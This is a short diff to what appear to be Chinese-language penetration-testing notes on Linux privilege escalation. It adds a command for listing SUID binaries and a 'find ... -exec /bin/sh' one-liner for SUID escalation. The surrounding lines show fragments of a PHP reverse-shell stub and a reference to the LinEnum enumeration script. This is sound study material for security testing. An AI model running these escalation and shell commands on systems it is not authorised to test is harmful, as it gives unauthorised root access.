@@ -291,6 +291,7 @@ chmod +x LinEnum.sh
 ```
 - 或者直接查看权限命令
 > find / -perm -u=s -type f 2>/dev/null
+> find / -perm /4000 2>/dev/null
 
 ```
 /bin/mount
@@ -342,3 +343,4 @@ exec("/bin/sh -i <&3 >&3 2>&3");
 ?>
 ```
 * SUID提权
+> find test -exec '/bin/sh' \;
